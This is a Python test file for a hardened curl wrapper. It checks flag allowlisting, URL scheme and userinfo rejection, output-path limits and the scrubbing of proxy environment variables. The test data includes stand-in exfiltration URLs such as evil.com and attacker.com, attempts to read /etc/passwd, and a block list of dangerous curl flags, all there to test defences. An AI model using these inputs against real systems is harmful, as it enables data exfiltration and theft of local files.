"""Validation gate tests for cidx-curl.sh (Story #929 Item #2a).

Tests cover: whitelist curl flag enforcement, URL scheme detection, invalid port
rejection, userinfo bypass rejection, at-sign prefix rejection, and output
path restriction. All tests invoke the wrapper via subprocess.

Story #929 Codex Pass 5 escalation: switched from blacklist to whitelist architecture.
Blacklist-era classes removed:
  TestBannedFlagsRejected, TestRedirectFlagsBanned,
  TestNewlyBannedFlagsBanned, TestUrlAndNextAliasBanned.
Whitelist-era classes added:
  TestAllowedFlagsAccepted, TestRejectedFlagsBlocked,
  TestAtSignPrefixRejected, TestOutputPathRestricted.
"""

import subprocess

import pytest

from tests.unit.test_cidx_curl_wrapper_helpers import (
    WRAPPER,
    _run,
    _run_no_curl,
    _write_config,
)

# ---------------------------------------------------------------------------
# Exit code named constants
# ---------------------------------------------------------------------------
_EXIT_SUCCESS = 0
_EXIT_REJECTED = 2  # validation rejected (flag not in allowlist, bad URL, etc.)
_EXIT_DNS_FAIL = 3  # DNS resolution failed
_EXIT_CIDR_BLOCKED = 4  # resolved IP not in allowed CIDR set

# ---------------------------------------------------------------------------
# URLs
# ---------------------------------------------------------------------------
_LOOPBACK_URL = "http://127.0.0.1/"
_FAKE_CURL_TARGET_URL = "http://127.0.0.1:8080/health"
_ATTACKER_PROXY_URL = "http://attacker.example.com:8080"

# ---------------------------------------------------------------------------
# Fake-curl infrastructure
# ---------------------------------------------------------------------------
_ATTACKER_CURL_HOME = "/tmp/attacker"
_ATTACKER_CA_BUNDLE = "/tmp/attacker.pem"
_FAKE_CURL_TIMEOUT = 15
_FAKE_CURL_MODE = 0o755
_FAKE_BIN_DIR_NAME = "fake-bin"
_FAKE_CURL_BIN_NAME = "curl"
_PATH_ENV_VAR = "PATH"

_ENV_AND_ARG_PRINTING_SCRIPT = (
    "#!/bin/bash\n"
    'echo "http_proxy=${http_proxy:-UNSET}"\n'
    'echo "HTTPS_PROXY=${HTTPS_PROXY:-UNSET}"\n'
    'echo "all_proxy=${all_proxy:-UNSET}"\n'
    'echo "CURL_HOME=${CURL_HOME:-UNSET}"\n'
    'echo "CURL_CA_BUNDLE=${CURL_CA_BUNDLE:-UNSET}"\n'
    'for arg in "$@"; do echo "ARG=$arg"; done\n'
    "exit 0\n"
)
_ARG_PRINTING_SCRIPT = (
    '#!/bin/bash\nfor arg in "$@"; do echo "ARG=$arg"; done\nexit 0\n'
)

# ---------------------------------------------------------------------------
# Env-scrub constants
# ---------------------------------------------------------------------------
_ENV_HTTP_PROXY = "http_proxy"
_ENV_HTTPS_PROXY = "HTTPS_PROXY"
_ENV_ALL_PROXY = "all_proxy"
_ENV_CURL_HOME = "CURL_HOME"
_ENV_CURL_CA_BUNDLE = "CURL_CA_BUNDLE"

_ASSERT_HTTP_PROXY_UNSET = "http_proxy=UNSET"
_ASSERT_HTTPS_PROXY_UNSET = "HTTPS_PROXY=UNSET"
_ASSERT_ALL_PROXY_UNSET = "all_proxy=UNSET"
_ASSERT_CURL_HOME_UNSET = "CURL_HOME=UNSET"
_ASSERT_CURL_CA_BUNDLE_UNSET = "CURL_CA_BUNDLE=UNSET"

_INJECTED_FLAG_CASES = [
    ("ARG=-q", "-q must be injected to disable default ~/.curlrc (CRIT-NEW-4)"),
    ("ARG=--noproxy", "--noproxy must be injected to defeat proxy bypass (CRIT-NEW-3)"),
    ("ARG=*", "noproxy wildcard '*' must follow --noproxy arg (CRIT-NEW-3)"),
]

# Expected error message substring for at-sign prefix rejection
_AT_SIGN_REJECTION_MSG = "at-sign prefix rejected"


# ---------------------------------------------------------------------------
# Shared test helper: write empty-CIDR config and invoke wrapper without
# extra curl flags. Eliminates the repeated 3-line setup block in parametrized
# tests that expect validation to reject before curl is reached.
# Tests that use real curl (_run) keep their explicit setup to remain distinct.
# ---------------------------------------------------------------------------
def _run_validated(isolated_config, *args):
    """Write empty-CIDR config and run the wrapper with the given args.

    Returns the CompletedProcess result. Callers assert on returncode/stderr.
    Not used for tests that call _run() (real curl with --max-time/-s/-o).
    """
    config_path, env = isolated_config
    _write_config(config_path, [])
    return _run_no_curl(env, *args)


# ===========================================================================
# Whitelist era: allowed flags pass validation
# ===========================================================================


class TestAllowedFlagsAccepted:
    """Whitelist architecture: only explicitly-allowed flags pass (Story #929 Pass 5)."""

    @pytest.mark.parametrize(
        "flag,value",
        [
            ("-X", "POST"),
            ("--request", "GET"),
            ("-H", "X-Foo: bar"),
            ("--header", "Accept: application/json"),
            ("-d", "key=val"),
            ("--data", "raw body"),
            ("--data-urlencode", "k=v"),
            ("--data-raw", "raw"),
            ("-A", "MyAgent/1"),
            ("--user-agent", "MyAgent/1"),
            ("-e", "http://referer/"),
            ("--referer", "http://x/"),
            ("-u", "user:pass"),
            ("--user", "u:p"),
            ("--max-time", "5"),
            ("--connect-timeout", "2"),
            ("-o", "/dev/null"),
            ("--output", "/dev/null"),
        ],
    )
    def test_allowed_flag_with_value_accepted(self, isolated_config, flag, value):
        result = _run_validated(isolated_config, flag, value, "http://127.0.0.1:1/")
        assert result.returncode != _EXIT_REJECTED, (
            f"{flag} {value!r} should be allowed but got exit {_EXIT_REJECTED}: "
            f"stderr={result.stderr}"
        )
        assert result.returncode != _EXIT_CIDR_BLOCKED

    @pytest.mark.parametrize(
        "flag",
        [
            "-s",
            "--silent",
            "-S",
            "--show-error",
            "-i",
            "--include",
            "-I",
            "--head",
            "-f",
            "--fail",
            "-v",
            "--verbose",
            "--compressed",
            "--http1.0",
            "--http1.1",
            "--http2",
        ],
    )
    def test_allowed_flag_no_value_accepted(self, isolated_config, flag):
        result = _run_validated(isolated_config, flag, "http://127.0.0.1:1/")
        assert result.returncode != _EXIT_REJECTED, (
            f"{flag} should be allowed but got exit {_EXIT_REJECTED}: stderr={result.stderr}"
        )

    @pytest.mark.parametrize(
        "flag",
        ["--request=POST", "--header=X-Foo: bar", "--data=body", "--max-time=5"],
    )
    def test_equals_form_accepted(self, isolated_config, flag):
        # Check that the wrapper's whitelist scanner accepts the flag (does not
        # emit "not in allowlist"). curl itself may reject --flag=value syntax
        # on some versions (curl exits 2 for its own reasons), so we cannot
        # assert on returncode — only on the absence of the wrapper's rejection.
        result = _run_validated(isolated_config, flag, "http://127.0.0.1:1/")
        assert "not in allowlist" not in result.stderr, (
            f"{flag} equals form must not be rejected by wrapper: stderr={result.stderr}"
        )


# ===========================================================================
# Whitelist era: flags not in allowlist are rejected
# ===========================================================================


class TestRejectedFlagsBlocked:
    """Whitelist: any flag absent from the allowlist must cause exit 2."""

    @pytest.mark.parametrize(
        "args",
        [
            ("-O",),
            ("--output-dir", "/tmp"),
            ("--create-dirs",),
            ("--cookie-jar", "/tmp/c"),
            ("-c", "/tmp/c"),
            ("--etag-save", "/tmp/e"),
            ("--trace", "/tmp/t"),
            ("--trace-ascii", "/tmp/t"),
            ("--dump-header", "/tmp/h"),
            ("-D", "/tmp/h"),
            ("-T", "/tmp/file"),
            ("--upload-file", "/tmp/file"),
            ("-F", "name=/etc/passwd"),
            ("--form", "name=/etc/passwd"),
            ("--negotiate",),
            ("--ntlm",),
            ("--krb", "private"),
            ("--aws-sigv4", "aws:amz:us-east-1:s3"),
            ("--netrc",),
            ("--netrc-file", "/tmp/nrc"),
            ("--key", "/tmp/k"),
            ("--cert", "/tmp/c"),
            ("--cacert", "/tmp/ca"),
            ("--capath", "/tmp/capath"),
            ("-E", "/tmp/cert"),
            ("-L",),
            ("--location",),
            ("--next",),
            ("-:",),
            ("--metalink",),
            ("--url", "file:///etc/hostname"),
            ("--proto", "+file"),
            ("--proto-default", "http"),
            ("--proto-redir", "+all"),
            ("--alt-svc", "/tmp/x"),
            ("--hsts", "/tmp/x"),
            ("--config", "/tmp/x"),
            ("-K", "/tmp/x"),
            ("-w", "%{http_code}"),
            ("--write-out", "%{http_code}"),
            ("-Z",),
            ("--parallel",),
            ("--insecure",),
            ("-k",),
            ("--proxy", "http://x/"),
            ("-x", "http://x/"),
            ("--socks5", "x:1080"),
            ("--unix-socket", "/tmp/s"),
            ("--noproxy", "*"),
            ("--interface", "eth0"),
            ("--dns-servers", "8.8.8.8"),
            ("--doh-url", "https://x/"),
            ("--proxy-user", "u:p"),
            ("-U", "u:p"),
            ("--resolve", "x:80:1.2.3.4"),
            ("--connect-to", "x:80:y:80"),
        ],
    )
    def test_disallowed_flag_rejected(self, isolated_config, args):
        result = _run_validated(isolated_config, *args, "http://127.0.0.1:1/")
        assert result.returncode == _EXIT_REJECTED, (
            f"Args {args} should be REJECTED (exit {_EXIT_REJECTED}) "
            f"but got {result.returncode}: stderr={result.stderr}"
        )


# ===========================================================================
# URL / scheme detection
# ===========================================================================


class TestSchemeAndUrlValidation:
    """Wrapper must exit 2 when no http(s) URL is found or scheme is wrong."""

    def test_no_url_argument_rejected(self, isolated_config):
        _, env = isolated_config
        result = _run_no_curl(env)
        assert result.returncode == _EXIT_REJECTED
        assert "no http(s) URL" in result.stderr

    def test_only_flags_no_url_rejected(self, isolated_config):
        _, env = isolated_config
        result = _run_no_curl(env, "--max-time", "5")
        assert result.returncode == _EXIT_REJECTED

    @pytest.mark.parametrize(
        "url",
        [
            "file:///etc/passwd",
            "ftp://127.0.0.1/x",
            "gopher://127.0.0.1/x",
        ],
    )
    def test_non_http_scheme_rejected(self, isolated_config, url):
        result = _run_validated(isolated_config, url)
        assert result.returncode == _EXIT_REJECTED


# ===========================================================================
# Invalid port
# ===========================================================================


class TestInvalidPortRejected:
    """Python urlparse raises ValueError on non-numeric/out-of-range ports → exit 2."""

    @pytest.mark.parametrize(
        "url",
        [
            "http://127.0.0.1:abc/",
            "http://127.0.0.1:99999/",
        ],
    )
    def test_invalid_port_rejected(self, isolated_config, url):
        result = _run_validated(isolated_config, url)
        assert result.returncode == _EXIT_REJECTED, (
            f"Invalid port in {url} must exit {_EXIT_REJECTED}: {result.stderr}"
        )


# ===========================================================================
# Userinfo bypass
# ===========================================================================


class TestUserinfoBypassRejected:
    """http://user@host/ URLs must be rejected; at-sign in path/query is legal."""

    @pytest.mark.parametrize(
        "url",
        [
            "http://10.0.0.1@evil.com/exfil",
            "http://user:pass@127.0.0.1/health",
        ],
    )
    def test_userinfo_rejected(self, isolated_config, url):
        result = _run_validated(isolated_config, url)
        assert result.returncode == _EXIT_REJECTED
        assert "userinfo" in result.stderr.lower()

    @pytest.mark.parametrize(
        "url",
        [
            "http://127.0.0.1/foo@bar",
            "http://127.0.0.1/search?q=foo@bar",
        ],
    )
    def test_at_sign_outside_authority_accepted(self, isolated_config, url):
        # Uses _run (real curl with --max-time/-s/-o) because we must reach
        # the curl exec stage to confirm the URL is not rejected by the wrapper.
        config_path, env = isolated_config
        _write_config(config_path, [])
        result = _run(env, url)
        assert result.returncode != _EXIT_REJECTED, (
            f"at-sign in path/query must not reject: stderr={result.stderr}"
        )


# ===========================================================================
# Multi-URL rejection
# ===========================================================================


class TestMultiUrlRejected:
    """Wrapper must reject argv containing more than one http(s) URL."""

    @pytest.mark.parametrize(
        "extra_urls",
        [
            ("http://attacker.com/?stolen=secret",),
            ("http://127.0.0.1/foo", "http://127.0.0.1/bar"),
        ],
    )
    def test_multiple_urls_rejected(self, isolated_config, extra_urls):
        result = _run_validated(isolated_config, "http://127.0.0.1/health", *extra_urls)
        assert result.returncode == _EXIT_REJECTED

    def test_single_url_still_works(self, isolated_config):
        result = _run_validated(
            isolated_config,
            "--max-time",
            "1",
            "-s",
            "-o",
            "/dev/null",
            "http://127.0.0.1:1/",
        )
        assert result.returncode != _EXIT_REJECTED
        assert result.returncode != _EXIT_CIDR_BLOCKED

    def test_url_in_data_arg_falsely_counted(self, isolated_config):
        """Whitelist behavior: -d value is consumed as the flag's data argument,
        not counted as a URL token. The whitelist scanner advances past the value
        without inspecting its content for http-scheme patterns. Only bare positional
        http(s):// tokens (not consumed as flag values) increment URL_COUNT.
        With a single positional URL the multi-URL gate does not trigger.
        """
        result = _run_validated(
            isolated_config,
            "-d",
            "http://attacker.com/?stolen=x",
            "http://127.0.0.1/",
        )
        # Whitelist: -d value is consumed as data, not double-counted as URL.
        assert result.returncode != _EXIT_REJECTED, (
            f"-d http-shaped value should not trigger multi-URL rejection: "
            f"stderr={result.stderr}"
        )


# ===========================================================================
# Whitelist era: at-sign prefix guard (file-read primitive)
# ===========================================================================


class TestAtSignPrefixRejected:
    """Whitelist security rule: at-sign prefix on data/header values reads files — reject."""

    @pytest.mark.parametrize(
        "flag",
        [
            "-d",
            "--data",
            "--data-urlencode",
            "--data-raw",
            "-H",
            "--header",
        ],
    )
    def test_at_sign_prefix_rejected(self, isolated_config, flag):
        result = _run_validated(
            isolated_config, flag, "@/etc/passwd", "http://127.0.0.1/"
        )
        assert result.returncode == _EXIT_REJECTED, (
            f"{flag} with at-sign prefix must exit {_EXIT_REJECTED}: stderr={result.stderr}"
        )
        assert _AT_SIGN_REJECTION_MSG in result.stderr.lower(), (
            f"Expected '{_AT_SIGN_REJECTION_MSG}' in stderr: {result.stderr}"
        )

    @pytest.mark.parametrize(
        "flag,value",
        [
            ("-d", "key=value"),
            ("-H", "X-Foo: bar"),
        ],
    )
    def test_normal_value_accepted(self, isolated_config, flag, value):
        result = _run_validated(isolated_config, flag, value, "http://127.0.0.1:1/")
        assert result.returncode != _EXIT_REJECTED, (
            f"{flag} with normal value should be allowed: stderr={result.stderr}"
        )


# ===========================================================================
# Whitelist era: output path restriction
# ===========================================================================


class TestOutputPathRestricted:
    """Whitelist security rule: -o / --output must be /dev/null or - (stdout only)."""

    @pytest.mark.parametrize(
        "flag,value",
        [
            ("-o", "/dev/null"),
            ("-o", "-"),
            ("--output", "/dev/null"),
            ("--output", "-"),
        ],
    )
    def test_allowed_output_accepted(self, isolated_config, flag, value):
        result = _run_validated(isolated_config, flag, value, "http://127.0.0.1:1/")
        assert result.returncode != _EXIT_REJECTED, (
            f"{flag} {value!r} should be accepted: stderr={result.stderr}"
        )

    @pytest.mark.parametrize(
        "flag,value",
        [
            ("-o", "/tmp/leak"),
            ("-o", "outfile.txt"),
            ("--output", "/etc/passwd"),
            ("--output", "outfile.txt"),
        ],
    )
    def test_disallowed_output_rejected(self, isolated_config, flag, value):
        result = _run_validated(isolated_config, flag, value, "http://127.0.0.1/")
        assert result.returncode == _EXIT_REJECTED, (
            f"{flag} {value!r} (arbitrary path) must exit {_EXIT_REJECTED}: "
            f"stderr={result.stderr}"
        )


# ===========================================================================
# Shared helpers for fake-curl environment setup
# ===========================================================================


def _make_fake_curl_env(isolated_config, tmp_path, script_body: str, extra_env=None):
    """Create a fake curl binary and return the prepared env dict."""
    config_path, env = isolated_config
    _write_config(config_path, [])
    fake_curl_dir = tmp_path / _FAKE_BIN_DIR_NAME
    fake_curl_dir.mkdir()
    fake_curl = fake_curl_dir / _FAKE_CURL_BIN_NAME
    fake_curl.write_text(script_body)
    fake_curl.chmod(_FAKE_CURL_MODE)
    env_with_fake = env.copy()
    env_with_fake[_PATH_ENV_VAR] = f"{fake_curl_dir}:{env.get(_PATH_ENV_VAR, '')}"
    if extra_env:
        env_with_fake.update(extra_env)
    return env_with_fake


def _run_wrapper_with_fake_curl(env_with_fake):
    """Run the wrapper against _FAKE_CURL_TARGET_URL with the given env."""
    return subprocess.run(
        [str(WRAPPER), _FAKE_CURL_TARGET_URL],
        env=env_with_fake,
        capture_output=True,
        text=True,
        timeout=_FAKE_CURL_TIMEOUT,
    )


# ===========================================================================
# Env scrub and curlrc defenses (Story #929 Codex Review #3)
# ===========================================================================


class TestEnvScrubAndCurlrcDefenses:
    """Prove env vars and ~/.curlrc cannot bypass --resolve pin."""

    def test_proxy_and_ca_env_vars_scrubbed(self, isolated_config, tmp_path):
        """Proxy and CA env vars must be scrubbed before curl runs."""
        env_with_fake = _make_fake_curl_env(
            isolated_config,
            tmp_path,
            script_body=_ENV_AND_ARG_PRINTING_SCRIPT,
            extra_env={
                _ENV_HTTP_PROXY: _ATTACKER_PROXY_URL,
                _ENV_HTTPS_PROXY: _ATTACKER_PROXY_URL,
                _ENV_ALL_PROXY: _ATTACKER_PROXY_URL,
                _ENV_CURL_HOME: _ATTACKER_CURL_HOME,
                _ENV_CURL_CA_BUNDLE: _ATTACKER_CA_BUNDLE,
            },
        )
        result = _run_wrapper_with_fake_curl(env_with_fake)
        assert result.returncode == _EXIT_SUCCESS, f"stderr={result.stderr}"
        assert _ASSERT_HTTP_PROXY_UNSET in result.stdout
        assert _ASSERT_HTTPS_PROXY_UNSET in result.stdout
        assert _ASSERT_ALL_PROXY_UNSET in result.stdout
        assert _ASSERT_CURL_HOME_UNSET in result.stdout
        assert _ASSERT_CURL_CA_BUNDLE_UNSET in result.stdout

    @pytest.mark.parametrize("expected_marker,description", _INJECTED_FLAG_CASES)
    def test_injected_flags_present(
        self, isolated_config, tmp_path, expected_marker, description
    ):
        """Wrapper must inject -q, --noproxy, and '*' into every curl invocation."""
        env_with_fake = _make_fake_curl_env(
            isolated_config,
            tmp_path,
            script_body=_ARG_PRINTING_SCRIPT,
        )
        result = _run_wrapper_with_fake_curl(env_with_fake)
        assert result.returncode == _EXIT_SUCCESS, f"stderr={result.stderr}"
        assert expected_marker in result.stdout, (
            f"{description}: stdout={result.stdout}"
        )
